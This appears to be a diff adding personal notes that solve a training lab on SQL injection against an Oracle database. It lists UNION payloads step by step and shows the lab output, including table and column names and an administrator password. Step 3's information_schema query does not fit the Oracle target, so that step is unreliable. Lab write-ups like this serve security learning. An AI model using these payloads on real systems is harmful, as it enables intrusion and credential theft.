@@ -1,0 +1,26 @@
+Lab: SQL injection attack, listing the database contents on Oracle
+
+S1: CHeck out the number of columns 
+COlumns : 2 --> 'order by 2--
+
+s2: Check out the string contaning columns
+'UNION select 'a','a' from dual--
+both column has string
+Username , password 
+
+S3: Find the table which contain the username and password
+SELECT table_name,NULL FROM information_schema.tables--
+USERS_JFXIAK
+
+S4: To find where the usernames and passwords are stored 
+SELECT column_name,NULL FROM all_tab_columns WHERE table_name = 'USERS_JFXIAK'--
+PASSWORD_AKNNFD,USERNAME_ZPDOMP
+
+S5: FInd the  password of administrator user 
+select USERNAME_ZPDOMP, PASSWORD_AKNNFD from USERS_JFXIAK--
+
+administrator
+7p2344vflsikfg332i1c
+
+
+#Do not copy same password coz it may be different for you
